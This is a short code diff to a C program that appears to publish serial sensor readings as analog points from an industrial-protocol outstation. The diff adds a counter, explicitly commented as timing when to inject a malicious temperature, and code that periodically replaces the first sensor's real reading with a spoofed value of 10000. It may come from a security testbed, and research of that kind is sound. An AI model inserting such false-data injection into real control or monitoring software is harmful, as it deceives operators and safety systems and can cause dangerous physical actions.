@@ -85,7 +85,8 @@ int main(int argc, char *argv[])
 	PyObject *pName, *pModule, *pFunc, *pArgs, *pValue;
 
 	Py_Initialize();
-	int test = 0;
+	int plague_counter = 0;     //counter for timing when to inject a malicious temperature
+
 	while(true) {
 		pName = PyString_FromString("read_serial");
 
@@ -112,7 +113,7 @@ int main(int argc, char *argv[])
 		int num_elements = 0;
 		char** sensor_info = (char**)malloc(sizeof(char*) * 1024);
  		char* serial_info;	
-		
+	
 		pValue = PyObject_CallObject(pFunc, pArgs);
 		//printf("FINISHED!\n");
 
@@ -139,7 +140,13 @@ int main(int argc, char *argv[])
 
 		for (index = 0; index < num_elements; index++){			
 			//printf("I got: %d FROM: %d ROUND:%d\n", atoi(sensor_info[index]),index,test);
-			builder.Update(Analog(atoi(sensor_info[index]), 0x01, time), index);
+			if(plague_counter == 10 && index == 0){
+				builder.Update(Analog(10000, 0x01, time), index);
+				plague_counter = 0;
+			}else{
+				builder.Update(Analog(atoi(sensor_info[index]), 0x01, time), index);
+				plague_counter++;
+			}
 		}
 
 		outstation->Apply(builder.Build());
